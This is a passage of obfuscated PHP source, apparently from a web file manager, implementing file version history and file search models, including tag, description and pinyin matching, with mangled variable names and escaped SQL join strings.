$this->_listAppendUser($Ñ×èˆÊ[$³î¹ë›¸[378]]); $üâ£‘‘æ = Model($³î¹ë›¸[768])->get($³î¹ë›¸[1237]); $ş‚•Ôí‚ = 5; if ($üâ£‘‘æ == $³î¹ë›¸[1238]) { $Ñ×èˆÊ[$³î¹ë›¸[378]] = array_slice($Ñ×èˆÊ[$³î¹ë›¸[378]], 0, $ş‚•Ôí‚); $Ñ×èˆÊ[$³î¹ë›¸[375]] = array($³î¹ë›¸[2093] => 1, $³î¹ë›¸[2094] => 20, $³î¹ë›¸[2095] => 1, $³î¹ë›¸[2096] => count($Ñ×èˆÊ[$³î¹ë›¸[378]])); } return $Ñ×èˆÊ; } protected function _listAppendUser(&$ÇÊÍÄùÎ) { $›ÀôŸò =& $_SERVER[¹Û¹Æ€]; $öº¦Ô¯â = array_to_keyvalue($ÇÊÍÄùÎ, $›ÀôŸò[22], $›ÀôŸò[1659]); $é¤¼Ş = Model($›ÀôŸò[544])->userListInfo($öº¦Ô¯â); foreach ($ÇÊÍÄùÎ as &$Ò‰‰ÍÂ«) { $¢»„±Ÿ = $Ò‰‰ÍÂ«[$›ÀôŸò[1659]]; $Ò‰‰ÍÂ«[$›ÀôŸò[463]] = $é¤¼Ş[$¢»„±Ÿ] ? $é¤¼Ş[$¢»„±Ÿ] : !1; } unset($Ò‰‰ÍÂ«); } public function fileInfo($Ü¼…æíš) { $ŸÚº¢“ =& $_SERVER[¹Û¹Æ€]; $¹ĞÕ§Äó = $this->tablePrefix; $ğ°­“ù¤ = "{$¹ĞÕ§Äó}\151\157\x5f\x66\x69\x6c\x65\x20\x66\x69\154\x65\x73\x20\157\156\x20\x66\151\x6c\145\x73\56\x66\151\x6c\145\111\104\40\75\x20\150\151\163\x74\x6f\162\171\x2e\x66\151\154\x65\x49\104"; return $this->alias($ŸÚº¢“[2097])->where(array($ŸÚº¢“[428] => $Ü¼…æíš))->join($ğ°­“ù¤, $ŸÚº¢“[2098])->find(); } public function removeItem($¸ø¶šı) { $“ÙÀ¨¤„ =& $_SERVER[¹Û¹Æ€]; $¿ãïâæŒ = array($“ÙÀ¨¤„[428] => $¸ø¶šı); $ÉÛí†ƒ• = $this->where($¿ãïâæŒ)->find(); if ($ÉÛí†ƒ•) { $¥™ã²Ôé = $this->where($¿ãïâæŒ)->delete(); Model($“ÙÀ¨¤„[480])->remove($ÉÛí†ƒ•[$“ÙÀ¨¤„[477]]); return $¥™ã²Ôé; } return !1; } public function removeBySource($—ØèŒš) { $¥—™Êß™ =& $_SERVER[¹Û¹Æ€]; if (!$—ØèŒš) { return !1; } if (!is_array($—ØèŒš)) { $—ØèŒš = array($—ØèŒš); } $ŞÂ¬ˆì = array($¥—™Êß™[426] => array($¥—™Êß™[17], $—ØèŒš)); $üı—†ö = $this->field($¥—™Êß™[478])->where($ŞÂ¬ˆì)->select(); if ($üı—†ö) { $this->where($ŞÂ¬ˆì)->delete(); $¼˜˜™˜ = array_to_keyvalue($üı—†ö, $¥—™Êß™[22], $¥—™Êß™[477]); Model($¥—™Êß™[480])->remove($¼˜˜™˜); } return !0; } public function setDetail($›„áú…ó, $Óä›ÖÆ) { $«¼«³Ê¶ =& $_SERVER[¹Û¹Æ€]; return $this->where(array($«¼«³Ê¶[428] => $›„áú…ó))->save(array($«¼«³Ê¶[2088] => $Óä›ÖÆ)); } public function rollbackToItem($û¤Û¥Û®, $Ó‚¿÷) { $ŞÒÖ›»ê =& $_SERVER[¹Û¹Æ€]; $Ò¥¾çÈ· = Model($ŞÒÖ›»ê[823])->sourceInfo($û¤Û¥Û®); $this->addHistory($Ò¥¾çÈ·, LNG($ŞÒÖ›»ê[2099])); $Ôˆ´üœ£ = $this->find($Ó‚¿÷); $‘ª†Üˆ¡ = array($ŞÒÖ›»ê[477] => $Ôˆ´üœ£[$ŞÒÖ›»ê[477]], $ŞÒÖ›»ê[86] => $Ôˆ´üœ£[$ŞÒÖ›»ê[86]], $ŞÒÖ›»ê[95] => time(), $ŞÒÖ›»ê[465] => USER_ID); Model($ŞÒÖ›»ê[823])->where(array($ŞÒÖ›»ê[411] => $û¤Û¥Û®))->save($‘ª†Üˆ¡); return $this->where(array($ŞÒÖ›»ê[428] => $Ó‚¿÷))->delete(); } public function clearSame($¼Â€ÀÒ½) { $‘Ê³ÀíŠ =& $_SERVER[¹Û¹Æ€]; $Â‡àé = $this->listData($¼Â€ÀÒ½); $¿±±Â¶½ = array_to_keyvalue_group($Â‡àé, $‘Ê³ÀíŠ[477]); $®™˜Ÿşè = array(); $áğöëñ¥ = array(); foreach ($¿±±Â¶½ as $û£ìŒ·ö) { if (!$û£ìŒ·ö || count($û£ìŒ·ö) <= 1) { continue; } foreach ($û£ìŒ·ö as $¨ş¡·¼…) { $®™˜Ÿşè[] = $¨ş¡·¼…[$‘Ê³ÀíŠ[477]]; $áğöëñ¥[] = $¨ş¡·¼…[$‘Ê³ÀíŠ[408]]; } } if (!$áğöëñ¥) { return; } $this->where(array($‘Ê³ÀíŠ[408] => array($‘Ê³ÀíŠ[17], $áğöëñ¥)))->delete(); Model($‘Ê³ÀíŠ[480])->remove($®™˜Ÿşè); } public function userSpace() { $ó°¯€¿Ø =& $_SERVER[¹Û¹Æ€]; $—Â¥°Î = $this->tablePrefix; $ÉôÑ×ØÕ = array($ó°¯€¿Ø[1650] => USER_ID); $Ñ†úÚĞ = "{$—Â¥°Î}\x69\x6f\x5f\146\151\154\x65\40\146\151\154\x65\163\x20\157\x6e\x20\x66\x69\x6c\145\163\56\x66\151\154\x65\x49\104\x20\75\40\150\151\x73\164\x6f\162\x79\x2e\x66\x69\154\145\111\x44"; return $this->alias($ó°¯€¿Ø[2097])->where($ÉôÑ×ØÕ)->join($Ñ†úÚĞ, $ó°¯€¿Ø[2098])->sum($ó°¯€¿Ø[86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ş´•³Îí) { $„ùÜÓÅå =& $_SERVER[¹Û¹Æ€]; $“ß½âµ = KodIO::fileTypeList(); $ã„€—·Ğ = $“ß½âµ[$ş´•³Îí]; if (!$ã„€—·Ğ) { return array(); } $İ¹ƒ»†¼ = $ã„€—·Ğ[$„ùÜÓÅå[184]]; $ÀïÔÑÕ¬ = $„ùÜÓÅå[17]; if (!$ã„€—·Ğ[$„ùÜÓÅå[184]]) { $¯š¿“¾Ì = array_to_keyvalue($“ß½âµ, $„ùÜÓÅå[22], $„ùÜÓÅå[184]); $İ¹ƒ»†¼ = implode($„ùÜÓÅå[60], $¯š¿“¾Ì); $ÀïÔÑÕ¬ = $„ùÜÓÅå[2100]; } $£ñÆ›®Á = explode($„ùÜÓÅå[60], trim($İ¹ƒ»†¼, $„ùÜÓÅå[60])); return array($ÀïÔÑÕ¬, $£ñÆ›®Á); } public function listPathType($™’±ÜêÅ) { $½ÂÆÂ§ó =& $_SERVER[¹Û¹Æ€]; $ëÚ¡éÔÅ = $this->fileTypeWhere($™’±ÜêÅ); if (!$ëÚ¡éÔÅ) { return array(); } $ô¹õ—ÊÅ = USER_ID; $æ¡ü­íØ = Model($½ÂÆÂ§ó[544])->getInfo($ô¹õ—ÊÅ); $šØ•ó†’ = array($½ÂÆÂ§ó[595] => SourceModel::TYPE_USER, $½ÂÆÂ§ó[530] => array($½ÂÆÂ§ó[559], $½ÂÆÂ§ó[540] . $æ¡ü­íØ[$½ÂÆÂ§ó[96]][$½ÂÆÂ§ó[411]] . $½ÂÆÂ§ó[560]), $½ÂÆÂ§ó[596] => $ô¹õ—ÊÅ, $½ÂÆÂ§ó[592] => 0, $½ÂÆÂ§ó[593] => $ëÚ¡éÔÅ); return $this->listSource($šØ•ó†’); } public function listSearch($Şµó°á¨, $í’€Ïó = 300) { $Õ¤°ÈøÏ =& $_SERVER[¹Û¹Æ€]; if (isset($Şµó°á¨[$Õ¤°ÈøÏ[1943]]) && $Şµó°á¨[$Õ¤°ÈøÏ[1943]]) { $Şµó°á¨[$Õ¤°ÈøÏ[1943]] = str_replace($Õ¤°ÈøÏ[393], $Õ¤°ÈøÏ[2101], trim($Şµó°á¨[$Õ¤°ÈøÏ[1943]])); } $óó•¸Çß = $this->_parseSearchWhere($Şµó°á¨); if (!isset($óó•¸Çß[$Õ¤°ÈøÏ[440]])) { $óó•¸Çß[$Õ¤°ÈøÏ[440]] = 0; } $¼™îÊ÷ = $Õ¤°ÈøÏ[2102]; $’½½àµ» = $óó•¸Çß; $¾ ó©Õä = $¼™îÊ÷; $this->_listSearchBindPinyin($Şµó°á¨, $óó•¸Çß, $¼™îÊ÷); $this->alias($Õ¤°ÈøÏ[455])->_makeOrder(); $óó•¸Çß = $this->parseWhereLike($óó•¸Çß); $õçŞƒõ‹ = $this->distinct(!0)->field($¼™îÊ÷)->where($óó•¸Çß)->selectPage($í’€Ïó); if ($GLOBALS[$Õ¤°ÈøÏ[16]][$Õ¤°ÈøÏ[390]][$Õ¤°ÈøÏ[391]] && Input::check($Şµó°á¨[$Õ¤°ÈøÏ[1943]], $Õ¤°ÈøÏ[602]) && $õçŞƒõ‹[$Õ¤°ÈøÏ[375]][$Õ¤°ÈøÏ[362]] == 1 && $õçŞƒõ‹[$Õ¤°ÈøÏ[375]][$Õ¤°ÈøÏ[376]] == 0) { $õçŞƒõ‹ = $this->distinct(!0)->field($¼™îÊ÷)->where($’½½àµ»)->limit(1000)->select(); $õçŞƒõ‹ = array_page_split($õçŞƒõ‹, !1, $í’€Ïó); } $this->_listSearchFileContent($õçŞƒõ‹, $Şµó°á¨, $¾ ó©Õä, $’½½àµ»); $this->_listSearchDesc($õçŞƒõ‹, $Şµó°á¨, $¾ ó©Õä); $this->_listSearchTag($õçŞƒõ‹, $Şµó°á¨, $¾ ó©Õä); $this->_listSearchGroupTag($õçŞƒõ‹, $Şµó°á¨, $¾ ó©Õä); $this->_listDataApply($õçŞƒõ‹[$Õ¤°ÈøÏ[378]]); $this->_listMake($õçŞƒõ‹); return $õçŞƒõ‹; } private function _listSearchFileContent(&$£œöøòí, $œ‹’Ãı¢, $ËºäñÛû, $ãªğ‰) { $«¬É¥Ó‹ =& $_SERVER[¹Û¹Æ€]; if (!$œ‹’Ãı¢[$«¬É¥Ó‹[1943]] || $£œöøòí[$«¬É¥Ó‹[375]][$«¬É¥Ó‹[362]] > 1) { return; } if (!isset($ãªğ‰[$«¬É¥Ó‹[42]]) || !is_array($œ‹’Ãı¢[$«¬É¥Ó‹[477]])) { return; } $ãªğ‰[$«¬É¥Ó‹[477]] = array($«¬É¥Ó‹[17], $œ‹’Ãı¢[$«¬É¥Ó‹[477]]); unset($ãªğ‰[$«¬É¥Ó‹[42]]); unset($œ‹’Ãı¢[$«¬É¥Ó‹[477]]); $ö„Šœ“ò = $this->field($ËºäñÛû)->where($ãªğ‰)->limit($«¬É¥Ó‹[2103])->select(); if (!$ö„Šœ“ò || count($ö„Šœ“ò) == 0) { return; } $£œöøòí[$«¬É¥Ó‹[378]] = array_merge($ö„Šœ“ò, $£œöøòí[$«¬É¥Ó‹[378]]); $£œöøòí[$«¬É¥Ó‹[375]][$«¬É¥Ó‹[376]] += count($ö„Šœ“ò); } private function _listSearchTag(&$÷¥×û‰, $‚’ü›Æ, $¯ê±Â¸») { $ƒÙ®½ó =& $_SERVER[¹Û¹Æ€]; if (!$‚’ü›Æ[$ƒÙ®½ó[1943]] || $÷¥×û‰[$ƒÙ®½ó[375]][$ƒÙ®½ó[362]] > 1) { return; } $¸î¾³µÕ = Model($ƒÙ®½ó[2104])->listData(); $£•òÅñ = array(); $Ó•âµ¥¤ = $‚’ü›Æ[$ƒÙ®½ó[1943]]; foreach ($¸î¾³µÕ as $¯øøÓÌ) { $…õİÔÍÉ = $¯øøÓÌ[$ƒÙ®½ó[42]]; $ô²½ä’ì = str_replace($ƒÙ®½ó[63], $ƒÙ®½ó[22], Pinyin::get($…õİÔÍÉ)); if (stripos($…õİÔÍÉ, $Ó•âµ¥¤) !== !1 || stripos($ô²½ä’ì, $Ó•âµ¥¤) !== !1) { $£•òÅñ[] = $¯øøÓÌ[$ƒÙ®½ó[408]]; } } if (!$£•òÅñ) { return; } $æàé±§Ñ = array($ƒÙ®½ó[435] => array($ƒÙ®½ó[17], $£•òÅñ), $ƒÙ®½ó[1659] => USER_ID); $ê¸±¼ç = Model($ƒÙ®½ó[437])->field($ƒÙ®½ó[94])->where($æàé±§Ñ)->select(); $ê¸±¼ç = array_to_keyvalue($ê¸±¼ç, $ƒÙ®½ó[22], $ƒÙ®½ó[94]); $˜˜¤ººò = array_unique($ê¸±¼ç); $this->_listSearchMerge($÷¥×û‰, $‚’ü›Æ, $¯ê±Â¸», $˜˜¤ººò); } private function _listSearchDesc(&$ŒâÁ•è, $¿ò±´´ú, $ÊÅ‰“”) { $¹š•ÏÃ‹ =& $_SERVER[¹Û¹Æ€]; if (!$¿ò±´´ú[$¹š•ÏÃ‹[1943]] || $ŒâÁ•è[$¹š•ÏÃ‹[375]][$¹š•ÏÃ‹[362]] > 1) { return; } $ùÆ›±ùÓ = array($¹š•ÏÃ‹[104] => $¹š•ÏÃ‹[462], $¹š•ÏÃ‹[383] => array($¹š•ÏÃ‹[392], $¹š•ÏÃ‹[1945] . $¿ò±´´ú[$¹š•ÏÃ‹[1943]] . $¹š•ÏÃ‹[1945])); $â‚ÌùÍÛ = !1; if ($â‚ÌùÍÛ) { $ùá­ß½ = $this->listSearchChildren($¿ò±´´ú[$¹š•ÏÃ‹[441]]); $ùá­ß½ = array_unique($ùá­ß½); if (!$ùá­ß½) { return; } $ùÆ›±ùÓ[$¹š•ÏÃ‹[411]] = array($¹š•ÏÃ‹[17], $ùá­ß½); } $ƒƒ°¾²Í = Model($¹š•ÏÃ‹[578])->field($¹š•ÏÃ‹[411])->where($ùÆ›±ùÓ)->limit(5000)->select(); $×«©ƒªØ = array_to_keyvalue($ƒƒ°¾²Í, $¹š•ÏÃ‹[22], $¹š•ÏÃ‹[411]); $this->_listSearchMerge($ŒâÁ•è, $¿ò±´´ú, $ÊÅ‰“”, $×«©ƒªØ); } private function _listSearchGroupTag(&$ ¯Ö¯¤, $àÕ¹€, $«”¦Œí) { $øşÕ×à› =& $_SERVER[¹Û¹Æ€]; if (!$àÕ¹€[$øşÕ×à›[1943]] || $ ¯Ö¯¤[$øşÕ×à›[375]][$øşÕ×à›[362]] > 1 || !$àÕ¹€[$øşÕ×à›[441]]) { return; } $·˜Ò†œŒ = $this->sourceInfo($àÕ¹€[$øşÕ×à›[441]]); if (!$·˜Ò†œŒ || $·˜Ò†œŒ[$øşÕ×à›[420]] != SourceModel::TYPE_GROUP) { return; } $î±××¸é = $·˜Ò†œŒ[$øşÕ×à›[514]]; $•å•ğğş = Model($øşÕ×à›[2105])->get($î±××¸é); $¤‡Ç×– = array(); $›£—”Ö = $àÕ¹€[$øşÕ×à›[1943]]; foreach ($•å•ğğş[$øşÕ×à›[378]] as $ËúÑç¿“) { $’‹¼¦ = $ËúÑç¿“[$øşÕ×à›[42]]; $Â†ÔÅ÷¤ = str_replace($øşÕ×à›[63], $øşÕ×à›[22], Pinyin::get($’‹¼¦)); if (stripos($’‹¼¦, $›£—”Ö) !== !1 || stripos($Â†ÔÅ÷¤, $›£—”Ö) !== !1) { $¤‡Ç×–[] = $ËúÑç¿“[$øşÕ×à›[408]]; } } if (!$¤‡Ç×–) { return; } $”‡—–³Ê = array($øşÕ×à›[435] => array($øşÕ×à›[17], $¤‡Ç×–), $øşÕ×à›[1659] => 0, $øşÕ×à›[43] => $øşÕ×à›[1965] . $î±××¸é); $ãòçË»÷ = Model($øşÕ×à›[437])->field($øşÕ×à›[94])->where($”‡—–³Ê)->select(); $ãòçË»÷ = array_to_keyvalue($ãòçË»÷, $øşÕ×à›[22], $øşÕ×à›[94]); $Ëˆ¨Å“ = array_unique($ãòçË»÷); $this->_listSearchMerge($ ¯Ö¯¤, $àÕ¹€, $«”¦Œí, $Ëˆ¨Å“); } private function _listSearchMerge(&$ü¹Ë©×, $›è½ñÁ, $»Û¸¹»Ö, $¢ê­¨Õ) { $§ÂÈßªš =& $_SERVER[¹Û¹Æ€]; if (!$¢ê­¨Õ) { return; } $¤×§ÉÅ = array_to_keyvalue($ü¹Ë©×[$§ÂÈßªš[378]], $§ÂÈßªš[22], $§ÂÈßªš[411]); $Ş—Ö¾­ô = array_diff($¢ê­¨Õ, $¤×§ÉÅ); if (!$Ş—Ö¾­ô) { return; } $¥Œ²Õâò = array($§ÂÈßªš[411] => array($§ÂÈßªš[17], $Ş—Ö¾­ô)); $à™¢øø™ = $this->field($»Û¸¹»Ö)->where($¥Œ²Õâò)->select(); if (!$à™¢øø™) { return; } $ÇÊ‘Ì¹ = array(); foreach ($à™¢øø™ as $ŸÂŞç‘…) { if ($this->_listSearchFilter($ŸÂŞç‘…, $›è½ñÁ)) { $ÇÊ‘Ì¹[] = $ŸÂŞç‘…; } } $ü¹Ë©×[$§ÂÈßªš[378]] = array_merge($ÇÊ‘Ì¹, $ü¹Ë©×[$§ÂÈßªš[378]]); $ü¹Ë©×[$§ÂÈßªš[375]][$§ÂÈßªš[376]] += count($ÇÊ‘Ì¹); } private function _listSearchFilter($ÏŸşËµ, $˜ÕÏö€º) { $‘éÕ¹Ñå =& $_SERVER[¹Û¹Æ€]; $€Å¹ò‹Á = $ÏŸşËµ[$‘éÕ¹Ñå[419]] == $‘éÕ¹Ñå[98]; if (!strstr($ÏŸşËµ[$‘éÕ¹Ñå[530]], $‘éÕ¹Ñå[60] . $˜ÕÏö€º[$‘éÕ¹Ñå[441]] . $‘éÕ¹Ñå[60])) { return !1; } if (isset($˜ÕÏö€º[$‘éÕ¹Ñå[421]]) && $˜ÕÏö€º[$‘éÕ¹Ñå[421]] != $‘éÕ¹Ñå[1904]) { if ($˜ÕÏö€º[$‘éÕ¹Ñå[421]] == $‘éÕ¹Ñå[85] && !$€Å¹ò‹Á) { return !1; } if ($˜ÕÏö€º[$‘éÕ¹Ñå[421]] != $‘éÕ¹Ñå[85] && $€Å¹ò‹Á) { return !1; } if (!strstr($ÏŸşËµ[$‘éÕ¹Ñå[184]], $‘éÕ¹Ñå[60] . $˜ÕÏö€º[$‘éÕ¹Ñå[421]] . $‘éÕ¹Ñå[60])) { return !1; } } if (isset($˜ÕÏö€º[$‘éÕ¹Ñå[2106]]) && $˜ÕÏö€º[$‘éÕ¹Ñå[2106]] < $ÏŸşËµ[$‘éÕ¹Ñå[86]]) { return !1; } if (isset($˜ÕÏö€º[$‘éÕ¹Ñå[2107]]) && $˜ÕÏö€º[$‘éÕ¹Ñå[2107]] > $ÏŸşËµ[$‘éÕ¹Ñå[86]]) { return !1; } if (isset($˜ÕÏö€º[$‘éÕ¹Ñå[609]]) && $˜ÕÏö€º[$‘éÕ¹Ñå[609]] != $ÏŸşËµ[$‘éÕ¹Ñå[465]]) { return !1; } return !0; } public function listSearchChildren($Ø áÂŒ, $ûÍÙ·â = 5000) { $‡˜ö–î„ =& $_SERVER[¹Û¹Æ€]; $à¥ñ¹Ÿ = array(); $ğÊàË¶ä = $this->sourceInfo($Ø áÂŒ); $ï“Ç«¸ = array($‡˜ö–î„[530] => array($‡˜ö–î„[392], $ğÊàË¶ä[$‡˜ö–î„[530]] . $ğÊàË¶ä[$‡˜ö–î„[411]] . $‡˜ö–î„[560])); $Ÿ®ñ¦ = $this->field($‡˜ö–î„[86])->where($ï“Ç«¸)->limit($ûÍÙ·â + 1)->select(); $€¬ğˆ¹Û = is_array($Ÿ®ñ¦) ? count($Ÿ®ñ¦) : 0; if ($€¬ğˆ¹Û > $ûÍÙ·â) { return $this->_listSearchChildrenNear($Ø áÂŒ, $ûÍÙ·â); } $ã‡ÅÆê” = $this->field($‡˜ö–î„[411])->where($ï“Ç«¸)->select(); $à¥ñ¹Ÿ = array_to_keyvalue($ã‡ÅÆê”, $‡˜ö–î„[22], $‡˜ö–î„[411]); return $à¥ñ¹Ÿ; } private function _listSearchChildrenNear($óşâÍÁ, $÷ç®™©) { $ÍƒÖ³ÜÇ =& $_SERVER[¹Û¹Æ€]; $øÏñ›øĞ = array(); $ÊÍ¯ÙÌ = array($ÍƒÖ³ÜÇ[441] => $óşâÍÁ); $¬ÌÖİĞ = $this->field($ÍƒÖ³ÜÇ[2108])->where($ÊÍ¯ÙÌ)->select(); $ıõù¿®“ = array_to_keyvalue(array_filter_by_field($¬ÌÖİĞ, $ÍƒÖ³ÜÇ[419], $ÍƒÖ³ÜÇ[98]), $ÍƒÖ³ÜÇ[22], $ÍƒÖ³ÜÇ[411]); $øÏñ›øĞ = array_merge($øÏñ›øĞ, array_to_keyvalue($¬ÌÖİĞ, $ÍƒÖ³ÜÇ[22], $ÍƒÖ³ÜÇ[411])); if (!$ıõù¿®“) { return $øÏñ›øĞ; } $ÊÍ¯ÙÌ = array($ÍƒÖ³ÜÇ[441] => array($ÍƒÖ³ÜÇ[17], $ıõù¿®“)); $¬ÌÖİĞ = $this->field($ÍƒÖ³ÜÇ[2108])->where($ÊÍ¯ÙÌ)->limit($÷ç®™©)->select(); $øÏñ›øĞ = array_merge($øÏñ›øĞ, array_to_keyvalue($¬ÌÖİĞ, $ÍƒÖ³ÜÇ[22], $ÍƒÖ³ÜÇ[411])); $øÏñ›øĞ = array_slice($øÏñ›øĞ, 0, $÷ç®™©); return $øÏñ›øĞ; } private function _listSearchBindPinyin($˜ÙÄƒåõ, &$†¹ÂìüÄ, &$¼‹“ø¿¾) { $ºã‘‘˜Í =& $_SERVER[¹Û¹Æ€]; if (!isset($˜ÙÄƒåõ[$ºã‘‘˜Í[1943]]) || !$˜ÙÄƒåõ[$ºã‘‘˜Í[1943]]) { return; } if (!Input::check($˜ÙÄƒåõ[$ºã‘‘˜Í[1943]], $ºã‘‘˜Í[327]) || strlen($˜ÙÄƒåõ[$ºã‘‘˜Í[1943]]) < 2) { return; } $¡ÎÆº¡ = "\114\x45\x46\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\162\x63\145\x5f\x6d\x65\x74\x61\x20\155\x65\x74\141\x20\x6f\156\x20\x73\x6f\x75\162\x63\x65\x2e\163\x6f\x75\162\x63\145\x49\x44\x20\75\40\155\x65\164\x61\x2e\163\157\x75\x72\143\145\x49\x44"; $Ç³µ»ºø = array(); $¼‹“ø¿¾ = str_replace(array($ºã‘‘˜Í[12], $ºã‘‘˜Í[63], $ºã‘‘˜Í[2109]), $ºã‘‘˜Í[22], $¼‹“ø¿¾); $¼‹“ø¿¾ = $ºã‘‘˜Í[447] . str_replace($ºã‘‘˜Í[60], $ºã‘‘˜Í[448], $¼‹“ø¿¾); $ñÄäŸÆ‘ = $†¹ÂìüÄ[$ºã‘‘˜Í[42]]; unset($†¹ÂìüÄ[$ºã‘‘˜Í[42]]); foreach ($†¹ÂìüÄ as $âàËíîø => $œ¢¾â»£) { $Ç³µ»ºø[$ºã‘‘˜Í[447] . $âàËíîø] = $œ¢¾â»£; } foreach ($ñÄäŸÆ‘ as $âº‡²’) { $Ç³µ»ºø[] = array($ºã‘‘˜Í[452] => $âº‡²’, $ºã‘‘˜Í[997] => $ºã‘‘˜Í[1947], array($ºã‘‘˜Í[2110] => $âº‡²’, $ºã‘‘˜Í[2111] => array($ºã‘‘˜Í[17], array($ºã‘‘˜Í[474], $ºã‘‘˜Í[473])))); } $this->join($¡ÎÆº¡); $†¹ÂìüÄ = $Ç³µ»ºø; } private function _parseSearchWhere($ò²¼é–ß) { $íÊ´€¢ˆ =& $_SERVER[¹Û¹Æ€]; $ÁÉÔşşÍ = array(); if (isset($ò²¼é–ß[$íÊ´€¢ˆ[759]]) && $ò²¼é–ß[$íÊ´€¢ˆ[759]]) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[95]] = array($íÊ´€¢ˆ[2112], $ò²¼é–ß[$íÊ´€¢ˆ[759]]); } if (isset($ò²¼é–ß[$íÊ´€¢ˆ[506]]) && $ò²¼é–ß[$íÊ´€¢ˆ[506]]) { $³ƒÅŞË¼ = array($íÊ´€¢ˆ[2113], $ò²¼é–ß[$íÊ´€¢ˆ[506]]); if ($ÁÉÔşşÍ[$íÊ´€¢ˆ[95]]) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[95]] = array($ÁÉÔşşÍ[$íÊ´€¢ˆ[95]], $³ƒÅŞË¼, $íÊ´€¢ˆ[2114]); } else { $ÁÉÔşşÍ[$íÊ´€¢ˆ[95]] = $³ƒÅŞË¼; } } if (isset($ò²¼é–ß[$íÊ´€¢ˆ[2106]]) && $ò²¼é–ß[$íÊ´€¢ˆ[2106]] > 0) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[86]] = array($íÊ´€¢ˆ[2112], $ò²¼é–ß[$íÊ´€¢ˆ[2106]]); } if (isset($ò²¼é–ß[$íÊ´€¢ˆ[2107]]) && $ò²¼é–ß[$íÊ´€¢ˆ[2107]]) { $³ƒÅŞË¼ = array($íÊ´€¢ˆ[2113], $ò²¼é–ß[$íÊ´€¢ˆ[2107]]); if ($ÁÉÔşşÍ[$íÊ´€¢ˆ[86]]) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[86]] = array($ÁÉÔşşÍ[$íÊ´€¢ˆ[86]], $³ƒÅŞË¼, $íÊ´€¢ˆ[2114]); } else { $ÁÉÔşşÍ[$íÊ´€¢ˆ[86]] = $³ƒÅŞË¼; } } if (isset($ò²¼é–ß[$íÊ´€¢ˆ[609]]) && $ò²¼é–ß[$íÊ´€¢ˆ[609]]) { $ÁÉÔşşÍ[] = array($íÊ´€¢ˆ[465] => $ò²¼é–ß[$íÊ´€¢ˆ[609]], $íÊ´€¢ˆ[463] => $ò²¼é–ß[$íÊ´€¢ˆ[609]], $íÊ´€¢ˆ[997] => $íÊ´€¢ˆ[1947]); } if (isset($ò²¼é–ß[$íÊ´€¢ˆ[421]]) && $ò²¼é–ß[$íÊ´€¢ˆ[421]]) { $öğ‰°¢Œ = $ò²¼é–ß[$íÊ´€¢ˆ[421]]; if ($öğ‰°¢Œ == $íÊ´€¢ˆ[85]) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[419]] = 1; } else { if ($öğ‰°¢Œ == $íÊ´€¢ˆ[2115]) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[419]] = 0; } else { if ($öğ‰°¢Œ) { $öğ‰°¢Œ = is_array($öğ‰°¢Œ) ? $öğ‰°¢Œ : explode($íÊ´€¢ˆ[60], $öğ‰°¢Œ); $ÁÉÔşşÍ[$íÊ´€¢ˆ[421]] = array($íÊ´€¢ˆ[427], $öğ‰°¢Œ); $ÁÉÔşşÍ[$íÊ´€¢ˆ[419]] = 0; } } } } $this->_parseSearchParent($ò²¼é–ß, $ÁÉÔşşÍ); if (isset($ò²¼é–ß[$íÊ´€¢ˆ[1943]]) && trim($ò²¼é–ß[$íÊ´€¢ˆ[1943]])) { $ª¦îºÂû = trim($ò²¼é–ß[$íÊ´€¢ˆ[1943]]); $¶şÉ†¯¹ = explode($íÊ´€¢ˆ[63], $ª¦îºÂû); if (strlen($ª¦îºÂû) > 2 && (substr($ª¦îºÂû, 0, 1) == $íÊ´€¢ˆ[128] && substr($ª¦îºÂû, -1) == $íÊ´€¢ˆ[128]) || substr($ª¦îºÂû, 0, 1) == $íÊ´€¢ˆ[68] && substr($ª¦îºÂû, -1) == $íÊ´€¢ˆ[68]) { $ª¦îºÂû = substr($ª¦îºÂû, 1, -1); $¶şÉ†¯¹ = array($ª¦îºÂû); } $ÁÉÔşşÍ[$íÊ´€¢ˆ[42]] = array(array($íÊ´€¢ˆ[559], $íÊ´€¢ˆ[1945] . $ª¦îºÂû . $íÊ´€¢ˆ[1945])); if (count($¶şÉ†¯¹) > 1) { $ÁÉÔşşÍ[$íÊ´€¢ˆ[42]] = array(); foreach ($¶şÉ†¯¹ as $Ç‹¤ü‡¥) { if (!trim($Ç‹¤ü‡¥)) { continue; } $ÁÉÔşşÍ[$íÊ´€¢ˆ[42]][] = array($íÊ´€¢ˆ[559], $íÊ´€¢ˆ[1945] . trim($Ç‹¤ü‡¥) . $íÊ´€¢ˆ[1945]); } } } return $ÁÉÔşşÍ; } private function _parseSearchParent($ €ƒÓã, &$ªå—‹Ó¿) { $Ÿö¾¤ä‹ =& $_SERVER[¹Û¹Æ€]; if (!isset($ €ƒÓã[$Ÿö¾¤ä‹[441]]) || !$ €ƒÓã[$Ÿö¾¤ä‹[441]]) { return; } $¤ô¶„Òˆ = $this->pathInfo($ €ƒÓã[$Ÿö¾¤ä‹[441]]); $Öó¶ÛÏÓ = $¤ô¶„Òˆ[$Ÿö¾¤ä‹[441]] . $Ÿö¾¤ä‹[22] === $Ÿö¾¤ä‹[207]; $Ÿ£½£Ò» = $¤ô¶„Òˆ[$Ÿö¾¤ä‹[420]] == $Ÿö¾¤ä‹[524]; if ($¤ô¶„Òˆ[$Ÿö¾¤ä‹[541]] == $Ÿö¾¤ä‹[542]) { $¸â‹©Üç = $this->sourceInfo($ €ƒÓã[$Ÿö¾¤ä‹[441]]); $¤ô¶„Òˆ[$Ÿö¾¤ä‹[530]] = $¸â‹©Üç[$Ÿö¾¤ä‹[530]]; } $ªå—‹Ó¿[$Ÿö¾¤ä‹[599]] = array($Ÿö¾¤ä‹[559], $¤ô¶„Òˆ[$Ÿö¾¤ä‹[530]] . $ €ƒÓã[$Ÿö¾¤ä‹[441]] . $Ÿö¾¤ä‹[560]); $ÙÂ—ßâ = isset($ €ƒÓã[$Ÿö¾¤ä‹[1808]]) && in_array($Ÿö¾¤ä‹[524], $ €ƒÓã[$Ÿö¾¤ä‹[1808]]); if (!$ÙÂ—ßâ || !$Ÿ£½£Ò» || !$Öó¶ÛÏÓ || !$¤ô¶„Òˆ[$Ÿö¾¤ä‹[422]]) { 